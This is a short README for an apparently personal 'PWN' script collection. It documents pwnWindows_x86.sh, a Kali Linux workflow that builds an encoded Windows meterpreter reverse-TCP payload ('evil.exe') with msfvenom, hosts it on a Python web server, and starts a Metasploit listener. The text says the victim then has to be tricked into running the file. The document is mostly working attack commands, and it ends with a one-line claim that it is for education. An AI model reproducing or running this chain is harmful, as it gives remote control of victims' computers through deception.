# PWN
This section will contain scripts that I wrote to gain ownership to a machine.

|Name|Description|
|----|-----------|
|pwnWindows_x86.sh| Get a meterpreter shell from 32bit windows with evil.exe|

### pwnWindows_x86.sh
This is a script to be used in Kali linux where the tools are already preinstalled.
1. Getting own IP and port
    ```sh
    attackerip=`ifconfig eth0 | grep netmask | cut -d' ' -f10`
    attackerport=9107
    ```
    The backtick is equivalent to bash `$(...) `
    
2. Generate evil.exe
    ```sh
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$attackerip   LPORT=$attackerport -b '\x00\x0a\x0d' -f exe --arch x86 --platform windows -e x86/shikata_ga_nai -i 5 > evil.exe
    ```
    msfvenom is a very useful payload generator and encoder.
    
3. Host evil.exe on web server
    ```sh
    gnome-terminal --tab -e "python -m SimpleHTTPServer 80"
    ```
    A very simple way to start a web server with python2.7 
    `gnome-terminal --tab` was used to open up a separate terminal tab so that I can watch the web server on a separate terminal.
    
4. start metasploit meterpreter listener
    ```sh
    msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $attackerip; set LPORT $attackerport; run;"
    ```
    Now that the meterpreter is listening, we will need to trick the victim to download and run this malicious `evil.exe`

**This is just for education purpose, hence the obvious file naming without much trickery.**

 [dill]: <https://github.com/joemccann/dillinger>
